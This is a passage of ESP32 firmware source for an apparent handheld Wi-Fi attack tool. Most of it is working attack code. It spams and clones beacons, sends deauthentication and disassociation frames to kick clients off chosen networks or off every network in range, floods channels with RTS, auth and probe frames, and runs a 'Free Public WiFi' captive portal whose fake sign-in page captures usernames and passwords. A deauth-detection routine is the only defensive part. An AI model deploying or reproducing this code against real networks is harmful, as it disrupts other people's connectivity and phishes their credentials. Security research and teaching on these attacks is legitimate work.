  *p++ = 0x04;

  // SSID element
  uint8_t ssidLen = (uint8_t)strnlen(ssid, 32);
  *p++ = 0x00; *p++ = ssidLen;
  memcpy(p, ssid, ssidLen); p += ssidLen;

  // Supported rates
  *p++ = 0x01; *p++ = 0x08;
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x0C; *p++ = 0x12; *p++ = 0x18; *p++ = 0x24;

  // DS Parameter Set (channel)
  *p++ = 0x03; *p++ = 0x01; *p++ = channel;

  if (wpa2) {
    memcpy(p, rsn, sizeof(rsn));
    p += sizeof(rsn);
  }
  return (int)(p - frame);
}

static void beaconStart() {
  radioAcquire(RADIO_WIFI_TX);
  beaconRunning = true;
  beaconIdx = 0;
  beaconCloneIdx = 0;
  customBeaconIdx = 0;
  beaconLast = 0;
  beaconCh = 1;
  beaconSent = 0;
  beaconPoolReady = false;
  beaconLastTxCh = 0;
  beaconSweep = 0;
  beaconRandomMac();
  if (webMode) {
    // Keep ESP32-TYPHON AP; only change channel for TX
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ESP32-TYPHON", "rgisking", beaconCh, 0, 4);
  } else {
    WiFi.mode(WIFI_AP);
    // minimal AP so WIFI_IF_AP exists for TX
    WiFi.softAP("esp32div", nullptr, beaconCh, 1 /* hidden */, 0);
  }
  radioSettleRequest(20);
  esp_wifi_set_channel(beaconCh, WIFI_SECOND_CHAN_NONE);
}

static void beaconStop() {
  beaconRunning = false;
  radioRelease(RADIO_WIFI_TX);
  if (webMode) {
    restoreWebAP();
  } else {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
  }
}

static void beaconPoolFillFunny(BeaconPoolEntry& e) {
  const char* s = beaconSSIDs[esp_random() % BEACON_SSID_COUNT];
  strncpy(e.ssid, s, 32); e.ssid[32] = 0;
  for (int i = 0; i < 6; i++) e.mac[i] = (uint8_t)esp_random();
  e.mac[0] = (e.mac[0] | 0x02) & 0xFE;
  e.wpa2 = (esp_random() % 10) < 4;
  e.age = 0;
  {
    static const uint8_t chs[] = {1, 6, 11};
    e.ch = webMode ? 1 : chs[esp_random() % 3];
  }
}
static void beaconPoolFillCustom(BeaconPoolEntry& e) {
  int idx = (customBeaconCount > 0) ? (int)(esp_random() % customBeaconCount) : 0;
  if (customBeaconCount > 0) strncpy(e.ssid, customBeaconSSIDs[idx], 32);
  else strncpy(e.ssid, "TYPHON", 32);
  e.ssid[32] = 0;
  for (int i = 0; i < 6; i++) e.mac[i] = (uint8_t)esp_random();
  e.mac[0] = (e.mac[0] | 0x02) & 0xFE;
  e.wpa2 = (esp_random() % 10) < 4;
  e.age = 0;
  e.ch = 1;
}
static void beaconPoolFillClone(BeaconPoolEntry& e) {
  if (wifiCount <= 0) { beaconPoolFillFunny(e); return; }
  int idx = (int)(esp_random() % wifiCount);
  strncpy(e.ssid, wifiNets[idx].ssid.c_str(), 32);
  e.ssid[32] = 0;
  for (int i = 0; i < 6; i++) e.mac[i] = (uint8_t)esp_random();
  e.mac[0] = (e.mac[0] | 0x02) & 0xFE;
  e.wpa2 = true;
  e.age = 0;
  e.ch = webMode ? 1 : wifiNets[idx].ch;
  if (e.ch < 1 || e.ch > 13) e.ch = 1;
}
static void beaconSendOne(const char* ssid, const uint8_t* mac, uint8_t ch, bool wpa2) {
  memcpy(beaconMac, mac, 6);
  if (ch != beaconLastTxCh) {
    esp_wifi_set_channel(wifiTxChannel(ch), WIFI_SECOND_CHAN_NONE);
    beaconLastTxCh = ch;
  }
  static uint8_t frame[128];
  int len = beaconBuildFrame(frame, ssid, ch, wpa2);
  if (len > 0) {
    esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
    esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
    beaconSent += 2;
  }
}
static void beaconUpdate() {
  if (!beaconRunning) return;
  if (millis() - beaconLast < 20) return;
  beaconLast = millis();

  auto fill = beaconPoolFillFunny;
  if (beaconMode == 2 && customBeaconCount > 0) fill = beaconPoolFillCustom;
  else if (beaconMode == 1 && wifiCount > 0) fill = beaconPoolFillClone;

  if (!beaconPoolReady) {
    for (int i = 0; i < BEACON_POOL_SIZE; i++) fill(beaconPool[i]);
    beaconPoolReady = true;
    beaconSweep = 0;
  }

  for (int i = 0; i < BEACON_POOL_SIZE; i++) {
    beaconSendOne(beaconPool[i].ssid, beaconPool[i].mac, beaconPool[i].ch, beaconPool[i].wpa2);
    if (++beaconPool[i].age >= BEACON_POOL_LIFE) fill(beaconPool[i]);
  }

  if (!webMode) {
    if (++beaconSweep >= 20) {
      beaconSweep = 0;
      static uint8_t hop = 0;
      static const uint8_t chs[] = {1, 6, 11};
      beaconCh = chs[hop++ % 3];
      esp_wifi_set_channel(beaconCh, WIFI_SECOND_CHAN_NONE);
      beaconLastTxCh = 0;
    }
  } else {
    beaconCh = 1;
  }
}

// ============================================================
//  Deauth Detector
// ============================================================
static volatile uint32_t deauthCount = 0;
static volatile uint8_t  detLastMac[6];
static volatile int8_t   detLastRssi = 0;
static volatile uint8_t  detLastCh = 0;
static volatile bool     detMacSeen = false;
static bool detRunning = false;
static uint8_t detCh = 1;
static bool detMainOnly = true;  // hop 1/6/11 vs all 1-13

static void IRAM_ATTR detSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* payload = p->payload;
  if (p->rx_ctrl.sig_len < 24) return;
  uint8_t subtype = (payload[0] & 0xF0);
  if (subtype == 0xC0 || subtype == 0xA0) {  // deauth or disassoc
    deauthCount++;
    // addr2 = source (bytes 10-15)
    for (int i = 0; i < 6; i++) detLastMac[i] = payload[10 + i];
    detLastRssi = p->rx_ctrl.rssi;
    detLastCh = detCh;
    detMacSeen = true;
  }
}

static void detStart() {
  deauthCount = 0;
  detMacSeen = false;
  detLastRssi = 0;
  detLastCh = 0;
  memset((void*)detLastMac, 0, 6);
  detCh = 1;
  detMainOnly = true;
  detRunning = true;
  if (webMode) {
    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect(false, false);
  } else {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
  }
  radioSettleRequest(20);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&detSniffer);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
}

static void detStop() {
  if (!detRunning) return;
  detRunning = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  if (webMode) restoreWebAP();
}

static void detUpdate() {
  if (!detRunning) return;
  static uint32_t last = 0;
  if (millis() - last > 280) {
    last = millis();
    if (detMainOnly) {
      if (detCh == 1) detCh = 6;
      else if (detCh == 6) detCh = 11;
      else detCh = 1;
    } else {
      detCh++;
      if (detCh > 13) detCh = 1;
    }
    esp_wifi_set_channel(detCh, WIFI_SECOND_CHAN_NONE);
  }
}

// ============================================================
//  Client sniffer (stations on a chosen AP) + Deauth
// ============================================================
#define CLIENT_MAX 128
#define CLIENT_Q_SIZE 192

struct ClientSta {
  uint8_t mac[6];
  int8_t  rssi;
  uint32_t lastSeen;
};

// Main-thread list (only mutated outside ISR)
static ClientSta clients[CLIENT_MAX];
static volatile int clientCount = 0;
static int       clientSniffAp = -1;
static volatile bool clientSniffRunning = false;
static uint32_t  clientSniffLast = 0;
static uint8_t   clientSniffBssid[6];
static uint8_t   clientSniffCh = 1;

// ISR → main ring buffer (IRAM-safe: no heap, no millis, no flash calls)
struct ClientQEntry {
  uint8_t mac[6];
  int8_t  rssi;
};
static ClientQEntry clientQ[CLIENT_Q_SIZE];
static volatile uint8_t clientQHead = 0;  // write index (ISR)
static volatile uint8_t clientQTail = 0;  // read index (main)

static inline bool IRAM_ATTR macEqualIRAM(const uint8_t* a, const uint8_t* b) {
  return a[0]==b[0] && a[1]==b[1] && a[2]==b[2] &&
         a[3]==b[3] && a[4]==b[4] && a[5]==b[5];
}
static inline bool IRAM_ATTR macIsBcastIRAM(const uint8_t* m) {
  return m[0]==0xFF && m[1]==0xFF && m[2]==0xFF &&
         m[3]==0xFF && m[4]==0xFF && m[5]==0xFF;
}
static inline bool IRAM_ATTR macIsZeroIRAM(const uint8_t* m) {
  return !(m[0]|m[1]|m[2]|m[3]|m[4]|m[5]);
}

static void IRAM_ATTR clientQPush(const uint8_t* mac, int8_t rssi) {
  if (!mac || macIsBcastIRAM(mac) || macIsZeroIRAM(mac)) return;
  if (macEqualIRAM(mac, clientSniffBssid)) return;
  uint8_t next = (uint8_t)((clientQHead + 1) % CLIENT_Q_SIZE);
  if (next == clientQTail) return;  // full — drop
  for (int i = 0; i < 6; i++) clientQ[clientQHead].mac[i] = mac[i];
  clientQ[clientQHead].rssi = rssi;
  clientQHead = next;
}

// Drain ISR queue into clients[] — call only from main loop
static void clientQDrain() {
  while (clientQTail != clientQHead) {
    uint8_t mac[6];
    int8_t rssi;
    for (int i = 0; i < 6; i++) mac[i] = clientQ[clientQTail].mac[i];
    rssi = clientQ[clientQTail].rssi;
    clientQTail = (uint8_t)((clientQTail + 1) % CLIENT_Q_SIZE);

    // Skip multicast (bit 0 of first octet)
    if (mac[0] & 0x01) continue;

    bool found = false;
    int n = clientCount;
    if (n > CLIENT_MAX) n = CLIENT_MAX;
    for (int i = 0; i < n; i++) {
      if (macEqualIRAM(clients[i].mac, mac)) {
        clients[i].rssi = rssi;
        clients[i].lastSeen = millis();
        found = true;
        break;
      }
    }
    if (!found && clientCount < CLIENT_MAX) {
      int idx = clientCount;
      for (int i = 0; i < 6; i++) clients[idx].mac[i] = mac[i];
      clients[idx].rssi = rssi;
      clients[idx].lastSeen = millis();
      clientCount = idx + 1;
    }
  }
  // Expire stations not seen for 60s
  uint32_t now = millis();
  for (int i = 0; i < clientCount; ) {
    if (now - clients[i].lastSeen > 60000UL) {
      for (int j = i; j < clientCount - 1; j++) clients[j] = clients[j + 1];
      clientCount--;
    } else i++;
  }
}

static void IRAM_ATTR clientSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!clientSniffRunning) return;
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
  if (p->rx_ctrl.sig_len < 24) return;
  const uint8_t* f = p->payload;
  uint8_t toDS = (f[1] & 0x01) ? 1 : 0;
  uint8_t fromDS = (f[1] & 0x02) ? 1 : 0;
  const uint8_t* addr1 = f + 4;
  const uint8_t* addr2 = f + 10;
  const uint8_t* addr3 = f + 16;
  int8_t rssi = p->rx_ctrl.rssi;
  if (toDS == 1 && fromDS == 0) {
    if (macEqualIRAM(addr1, clientSniffBssid)) clientQPush(addr2, rssi);
  } else if (toDS == 0 && fromDS == 1) {
    if (macEqualIRAM(addr2, clientSniffBssid)) clientQPush(addr1, rssi);
  } else if (toDS == 0 && fromDS == 0) {
    if (macEqualIRAM(addr3, clientSniffBssid)) {
      if (!macEqualIRAM(addr2, clientSniffBssid)) clientQPush(addr2, rssi);
      if (!macEqualIRAM(addr1, clientSniffBssid)) clientQPush(addr1, rssi);
    }
  }
}

static void clientSniffStop() {
  if (!clientSniffRunning) return;
  clientSniffRunning = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  if (webMode) restoreWebAP();
}

static void clientSniffStart(int apIdx) {
  if (webSafeBlocksPromisc()) return; // web-safe: no promiscuous off-channel sniff
  if (apIdx < 0 || apIdx >= wifiCount) return;
  clientSniffStop();
  clientSniffAp = apIdx;
  clientCount = 0;
  clientQHead = 0;
  clientQTail = 0;
  memcpy(clientSniffBssid, wifiNets[apIdx].bssid, 6);
  clientSniffCh = wifiNets[apIdx].ch;
  if (clientSniffCh < 1 || clientSniffCh > 13) clientSniffCh = 1;
  clientSniffRunning = true;
  clientSniffLast = millis();
  if (webMode) {
    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect(false, false);
  } else {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
  }
  radioSettleRequest(15);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&clientSnifferCb);
  esp_wifi_set_channel(clientSniffCh, WIFI_SECOND_CHAN_NONE);
}

static void clientSniffUpdate() {
  clientQDrain();  // always drain so list is usable after stop too
  if (!clientSniffRunning) return;
  if (millis() - clientSniffLast > 500) {
    clientSniffLast = millis();
    esp_wifi_set_channel(clientSniffCh, WIFI_SECOND_CHAN_NONE);
  }
}

// ----- Deauth -----

static int  deauthTarget = -1;
static uint32_t deauthSent = 0;
static uint32_t deauthLast = 0;
static uint8_t  deauthPacket[28];
static uint8_t  deauthClientIdx = 0;
static uint8_t  deauthPhase = 0;  // 0=bcast deauth 1=bcast disassoc 2=unicast clients

static const uint16_t DEAUTH_REASONS[] = {1, 3, 4, 6, 7, 8, 15, 16};
static const int DEAUTH_REASON_N = 8;

static void deauthBuildTo(uint8_t* out, const uint8_t* dest, const uint8_t* bssid, bool disassoc, uint16_t reason = 1) {
  memset(out, 0, 28);
  out[0] = disassoc ? 0xA0 : 0xC0;
  out[1] = 0x00;
  out[2] = 0x3A; out[3] = 0x01;
  memcpy(out + 4, dest, 6);
  memcpy(out + 10, bssid, 6);
  memcpy(out + 16, bssid, 6);
  out[24] = (uint8_t)(reason & 0xFF);
  out[25] = (uint8_t)((reason >> 8) & 0xFF);
}

static void deauthRadioPrep(uint8_t ch) {
  if (ch < 1 || ch > 13) ch = 1;
  if (webMode) {
    // Stay AP_STA so Soft-AP can return; TX on target channel during bursts
    WiFi.mode(WIFI_AP_STA);
  } else {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("esp32div", nullptr, ch, 1, 0);
  }
  esp_wifi_set_channel(wifiTxChannel(ch), WIFI_SECOND_CHAN_NONE);
}

static void deauthStart(int targetIdx) {
  if (targetIdx < 0 || targetIdx >= wifiCount) return;
  clientSniffStop();
  radioAcquire(RADIO_WIFI_TX);
  deauthTarget = targetIdx;
  deauthRunning = true;
  deauthSent = 0;
  deauthLast = 0;
  deauthClientIdx = 0;
  deauthPhase = 0;
  // Wave 1 B11: if no STA list for this AP, keep broadcast-only (user should Client Sniff first)
  uint8_t ch = wifiNets[targetIdx].ch;
  if (ch < 1 || ch > 13) ch = 1;
  if (webMode) {
    // Web-safe: Soft-AP + TX stay on CH1 (no off-channel hop)
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP("ESP32-TYPHON", "rgisking", 1, 0, 4);
  } else {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("esp32div", nullptr, ch, 1, 0);
  }
  radioSettleRequest(10);
  typhoonMaxWifiTx();
  typhoonApplyWarRadio();
  esp_wifi_set_channel(wifiTxChannel(ch), WIFI_SECOND_CHAN_NONE);
}

static void deauthStop() {
  deauthRunning = false;
  deauthTarget = -1;
  radioRelease(RADIO_WIFI_TX);
  if (webMode && !warMode) restoreWebAP();
  else {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
  }
}

static void deauthTx(const uint8_t* frame) {
  // no delay — non-blocking as possible
  esp_wifi_80211_tx(WIFI_IF_AP, frame, 28, false);
  deauthSent++;
}

static void deauthRestoreWebCh() {
  // Only Soft-AP web UI returns to CH1; handheld stays on attack channel
  if (webMode) wifiStayOnApChannel();
}

static void deauthUpdate() {
  if (!deauthRunning) return;
  clientQDrain();
  if (deauthTarget == -2) {
    if (wifiCount <= 0) { deauthStop(); return; }
    // Wave 1 B10: refresh AP list every 30s during attack-all
    if (!wifiScanning && (millis() - deauthRescanLast > 30000UL)) {
      deauthRescanLast = millis();
      wifiScanStart();
    }
    if (millis() - deauthLast < 6) return;
    deauthLast = millis();
    static int roundIdx = 0;
    if (roundIdx >= wifiCount) roundIdx = 0;
    int ti = roundIdx++;
    uint8_t ch = wifiNets[ti].ch;
    if (ch < 1 || ch > 13) ch = 1;
    esp_wifi_set_channel(wifiTxChannel(ch), WIFI_SECOND_CHAN_NONE);
    const uint8_t* bssid = wifiNets[ti].bssid;
    uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    deauthBuildTo(deauthPacket, bcast, bssid, false);
    for (int i = 0; i < 6; i++) deauthTx(deauthPacket);
    deauthBuildTo(deauthPacket, bcast, bssid, true);
    for (int i = 0; i < 3; i++) deauthTx(deauthPacket);
    if (clientSniffAp == ti) {
      for (int c = 0; c < clientCount; c++) {
        deauthBuildTo(deauthPacket, clients[c].mac, bssid, false);
        deauthTx(deauthPacket);
        deauthTx(deauthPacket);
      }
    }
    deauthRestoreWebCh();
    return;
  }
  if (deauthTarget < 0 || deauthTarget >= wifiCount) {
    deauthStop();
    return;
  }
  if (millis() - deauthLast < (webMode ? 12 : 3)) return;
  deauthLast = millis();

  const uint8_t* bssid = wifiNets[deauthTarget].bssid;
  uint8_t ch = wifiNets[deauthTarget].ch;
  if (ch < 1 || ch > 13) ch = 1;
  esp_wifi_set_channel(wifiTxChannel(ch), WIFI_SECOND_CHAN_NONE);

  uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

  // Phase rotate: broadcast deauth, broadcast disassoc, then unicast each client
  static uint8_t reasonIdx = 0;
  uint16_t reason = DEAUTH_REASONS[reasonIdx % DEAUTH_REASON_N];
  reasonIdx++;
  if (deauthPhase == 0) {
    deauthBuildTo(deauthPacket, bcast, bssid, false, reason);
    for (int i = 0; i < 8; i++) deauthTx(deauthPacket);
    // also STA->AP direction (dest=AP, source=fake STA)
    uint8_t sta[6]; for (int i=0;i<6;i++) sta[i]=(uint8_t)esp_random();
    sta[0]=(sta[0]|0x02)&0xFE;
    deauthBuildTo(deauthPacket, bssid, sta, false, reason);
    memcpy(deauthPacket+16, bssid, 6);
    for (int i = 0; i < 4; i++) deauthTx(deauthPacket);
    deauthPhase = 1;
  } else if (deauthPhase == 1) {
    deauthBuildTo(deauthPacket, bcast, bssid, true, reason);
    for (int i = 0; i < 5; i++) deauthTx(deauthPacket);
    deauthPhase = (clientCount > 0 && clientSniffAp == deauthTarget) ? 2 : 0;
    deauthClientIdx = 0;
  } else {
    if (clientCount == 0 || clientSniffAp != deauthTarget) {
      deauthPhase = 0;
      deauthRestoreWebCh();
      return;
    }
    int c = deauthClientIdx % clientCount;
    deauthBuildTo(deauthPacket, clients[c].mac, bssid, false);
    deauthTx(deauthPacket);
    deauthTx(deauthPacket);
    deauthBuildTo(deauthPacket, clients[c].mac, bssid, true);
    deauthTx(deauthPacket);
    deauthClientIdx++;
    if (deauthClientIdx >= clientCount) {
      deauthClientIdx = 0;
      deauthPhase = 0;
    }
  }
  // Return Soft-AP to CH1 so web UI stays reachable
  deauthRestoreWebCh();
}

static void deauthStartAll() {
  if (wifiCount <= 0) return;
  radioAcquire(RADIO_WIFI_TX);
  deauthTarget = -2;
  deauthRunning = true;
  deauthRescanLast = millis();
  deauthSent = 0;
  deauthLast = 0;
  deauthPhase = 0;
  if (webMode) {
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP("ESP32-TYPHON", "rgisking", 1, 0, 4);
  } else {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("esp32div", nullptr, 1, 1, 0);
  }
  radioSettleRequest(15);
}


// Negator-inspired: dense random beacons (noise on channel)
static void floodSendNoiseBeacon(uint8_t ch) {
  static uint8_t pkt[128];
  int o = 0;
  pkt[o++] = 0x80; pkt[o++] = 0x00;
  pkt[o++] = 0x00; pkt[o++] = 0x00;
  for (int i = 0; i < 6; i++) pkt[o++] = 0xFF;
  uint8_t mac[6];
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)esp_random();
  mac[0] = (mac[0] | 0x02) & 0xFE;
  memcpy(pkt + o, mac, 6); o += 6;
  memcpy(pkt + o, mac, 6); o += 6;
  pkt[o++] = 0x00; pkt[o++] = 0x00;
  for (int i = 0; i < 8; i++) pkt[o++] = 0x00;
  pkt[o++] = 0x64; pkt[o++] = 0x00;
  pkt[o++] = 0x01; pkt[o++] = 0x04;
  // SSID IE — short random/funny noise name
  static const char* noiseSsids[] = {
    "TyphonNoise", "CH_JAM", "....", "Free_WiFi?", "null", "~~", "ESP_FLOOD", "0xDEAD"
  };
  const char* ss = noiseSsids[esp_random() % 8];
  uint8_t sl = (uint8_t)strlen(ss);
  pkt[o++] = 0x00; pkt[o++] = sl;
  memcpy(pkt + o, ss, sl); o += sl;
  pkt[o++] = 0x01; pkt[o++] = 0x08;
  pkt[o++] = 0x82; pkt[o++] = 0x84; pkt[o++] = 0x8B; pkt[o++] = 0x96;
  pkt[o++] = 0x0C; pkt[o++] = 0x12; pkt[o++] = 0x18; pkt[o++] = 0x24;
  pkt[o++] = 0x03; pkt[o++] = 0x01; pkt[o++] = ch;
  pkt[o++] = 0x32; pkt[o++] = 0x04;
  pkt[o++] = 0x0C; pkt[o++] = 0x18; pkt[o++] = 0x30; pkt[o++] = 0x60;
  esp_wifi_80211_tx(WIFI_IF_AP, pkt, o, false);
  esp_wifi_80211_tx(WIFI_IF_STA, pkt, o, false);
  floodSent += 2;
}

static void floodUpdateImpl() {
  if (!floodRunning) return;
  // No millis gate: dual-core Option C paces with vTaskDelay(1) in wifiCoreLoop
  floodLast = millis();

  // Mode 3 = full 2.4GHz beacon storm (Negator-style channel hop)
  if (floodMode == 3 || floodTarget < 0) {
    static uint8_t hop = 1;
    hop = (hop % 13) + 1;
    esp_wifi_set_channel(hop, WIFI_SECOND_CHAN_NONE);
    for (int n = 0; n < 8; n++) floodSendNoiseBeacon(hop);
    // Extra RTS noise on this channel
    uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t sta[6];
    for (int i = 0; i < 6; i++) sta[i] = (uint8_t)esp_random();
    sta[0] = (sta[0] | 0x02) & 0xFE;
    floodBuildRts(bcast, sta);
    for (int i = 0; i < 4; i++) {
      esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 16, false);
      floodSent++;
    }
    return;
  }

  if (floodTarget >= wifiCount) { floodStop(); return; }
  uint8_t ch = wifiTxChannel(wifiNets[floodTarget].ch);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  const uint8_t* bssid = wifiNets[floodTarget].bssid;
  if (!floodStickyInit || (floodSent % 32) == 0) {
    for (int i = 0; i < 6; i++) floodStickySta[i] = (uint8_t)esp_random();
    floodStickySta[0] = (floodStickySta[0] | 0x02) & 0xFE;
    floodStickyInit = true;
  }
  const uint8_t* sta = floodStickySta;
  uint8_t mode = floodMode;
  if (mode == 0) {
    floodBuildRts(bssid, sta);
    for (int i = 0; i < 8; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 16, false); floodSent++; }
    for (int n = 0; n < 3; n++) floodSendNoiseBeacon(ch);
  } else if (mode == 1) {
    floodBuildRts(sta, bssid);
    floodPkt[0] = 0xC4;
    floodPkt[2] = 0xD0; floodPkt[3] = 0x02;
    for (int i = 0; i < 6; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 10, false); floodSent++; }
  } else {
    floodBuildAuth(bssid, sta);
    for (int i = 0; i < 5; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 30, false); floodSent++; }
    for (int n = 0; n < 2; n++) floodSendNoiseBeacon(ch);
  }
  // handheld: stay on target channel (no CH1 bounce)
  if (webMode) wifiStayOnApChannel();
}

//  Probe Flood – directed stress-test against one AP
// ============================================================

static int  probeTarget = -1;   // index into wifiNets (required)
static uint32_t probeSent = 0;
static uint32_t probeLast = 0;
static uint8_t  probeCh = 1;
static uint8_t  probeMac[6];
static uint8_t  probePacket[64];

static void probeRandomMac() {
  for (int i = 0; i < 6; i++) probeMac[i] = (uint8_t)esp_random();
  probeMac[0] = (probeMac[0] | 0x02) & 0xFE;
}

// Directed probe: Dest + BSSID = AP, SSID = target network name, DS channel = AP channel
static int probeBuildDirected(const char* ssid, const uint8_t* bssid, uint8_t ch) {
  memset(probePacket, 0, sizeof(probePacket));
  uint8_t* p = probePacket;
  *p++ = 0x40; *p++ = 0x00;           // Probe Request
  *p++ = 0x00; *p++ = 0x00;           // Duration
  memcpy(p, bssid, 6); p += 6;        // Dest = AP (directed)
  memcpy(p, probeMac, 6); p += 6;     // Source = fake STA
  memcpy(p, bssid, 6); p += 6;        // BSSID = AP
  *p++ = 0x00; *p++ = 0x00;           // Seq (filled loosely)
  uint8_t sl = ssid ? (uint8_t)strnlen(ssid, 32) : 0;
  *p++ = 0x00; *p++ = sl;             // SSID IE
  if (sl) { memcpy(p, ssid, sl); p += sl; }
  *p++ = 0x01; *p++ = 0x08;           // Supported rates
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x0C; *p++ = 0x12; *p++ = 0x18; *p++ = 0x24;
  *p++ = 0x03; *p++ = 0x01; *p++ = ch; // DS Parameter Set
  return (int)(p - probePacket);
}

static void probeStart(int targetIdx) {
  if (targetIdx < 0 || targetIdx >= wifiCount) return;
  radioAcquire(RADIO_WIFI_TX);
  probeTarget = targetIdx;
  probeRunning = true;
  probeSent = 0;
  probeLast = 0;
  probeCh = wifiNets[targetIdx].ch;
  if (probeCh < 1 || probeCh > 13) probeCh = 1;
  probeRandomMac();
  typhoonApplyWarRadio();
  typhoonMaxWifiTx();
  if (webMode && !warMode) {
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP("ESP32-TYPHON", "rgisking", 1, 0, 4);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  } else {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("esp32div", nullptr, probeCh, 1, 0);
    esp_wifi_set_channel(probeCh, WIFI_SECOND_CHAN_NONE);
  }
  radioSettleRequest(15);
}

static void probeStop() {
  probeRunning = false;
  radioRelease(RADIO_WIFI_TX);
  if (webMode && !warMode) restoreWebAP();
  else if (!webMode) {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
  }
}

static void probeUpdate() {
  if (!probeRunning) return;
  if (probeTarget < 0 || probeTarget >= wifiCount) { probeStop(); return; }
  if (millis() - probeLast < 4) return;
  probeLast = millis();

  const char* ssid = wifiNets[probeTarget].ssid.c_str();
  if (wifiNets[probeTarget].hidden || wifiNets[probeTarget].ssid == "<hidden>") ssid = "";
  const uint8_t* bssid = wifiNets[probeTarget].bssid;
  probeCh = wifiTxChannel(wifiNets[probeTarget].ch);

  // Sticky MAC for 80 frames then rotate
  if ((probeSent % 80) == 0) probeRandomMac();

  int len = probeBuildDirected(ssid, bssid, probeCh);
  esp_wifi_set_channel(probeCh, WIFI_SECOND_CHAN_NONE);
  for (int i = 0; i < 10; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, probePacket, len, false);
    probeSent++;
  }
  if (webMode) wifiStayOnApChannel();
}

// ============================================================
//  Captive Portal (basic SoftAP + DNS + simple page)
// ============================================================
static bool captiveRunning = false;
static DNSServer dnsServer;
static WebServer webServer(80);
static uint32_t captiveClients = 0;

static uint32_t captiveHits = 0;
static char captiveLastUser[32];
static char captiveLastPass[32];

static void handleCaptiveRoot() {
  captiveHits++;
  webServer.send(200, "text/html",
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Sign in</title>"
    "<style>body{font-family:system-ui;background:#111;color:#eee;text-align:center;padding:24px}"
    "input,button{width:90%;max-width:280px;padding:12px;margin:8px;border-radius:8px;border:0;font-size:16px}"
    "button{background:#0a84ff;color:#fff;font-weight:600}</style></head>"
    "<body><h2>Wi-Fi Sign In</h2>"
    "<p>Connect to the network</p>"
    "<form method='POST' action='/login'>"
    "<input name='u' placeholder='Email or username' required><br>"
    "<input name='p' type='password' placeholder='Password' required><br>"
    "<button type='submit'>Continue</button></form>"
    "<p style='opacity:.5;font-size:12px'>Demo portal – educational only</p>"
    "</body></html>");
}

static void handleCaptiveLogin() {
  captiveHits++;
  if (webServer.hasArg("u")) {
    strncpy(captiveLastUser, webServer.arg("u").c_str(), sizeof(captiveLastUser)-1);
    captiveLastUser[sizeof(captiveLastUser)-1] = 0;
  }
  if (webServer.hasArg("p")) {
    strncpy(captiveLastPass, webServer.arg("p").c_str(), sizeof(captiveLastPass)-1);
    captiveLastPass[sizeof(captiveLastPass)-1] = 0;
  }
  webServer.send(200, "text/html",
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Thanks</title></head>"
    "<body style='font-family:system-ui;text-align:center;padding:40px'>"
    "<h2>Connecting...</h2><p>Please wait</p></body></html>");
}

static void captiveStart() {
  captiveRunning = true;
  captiveClients = 0;
  captiveHits = 0;
  captiveLastUser[0] = 0;
  captiveLastPass[0] = 0;
  WiFi.mode(WIFI_AP);
  WiFi.softAP("Free Public WiFi", "");
  radioSettleRequest(40);
  dnsServer.start(53, "*", WiFi.softAPIP());
  webServer.onNotFound(handleCaptiveRoot);
  webServer.on("/", handleCaptiveRoot);
  webServer.on("/login", HTTP_POST, handleCaptiveLogin);
  webServer.on("/login", HTTP_GET, handleCaptiveRoot);
  webServer.begin();
}

static void captiveStop() {
  if (!captiveRunning) return;
  captiveRunning = false;
  // Critical: do not retain captured credentials after stop
  memset(captiveLastUser, 0, sizeof(captiveLastUser));
  memset(captiveLastPass, 0, sizeof(captiveLastPass));
  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
}

static void captiveUpdate() {
  if (!captiveRunning) return;
  dnsServer.processNextRequest();
  webServer.handleClient();
  captiveClients = WiFi.softAPgetStationNum();
}

// ============================================================
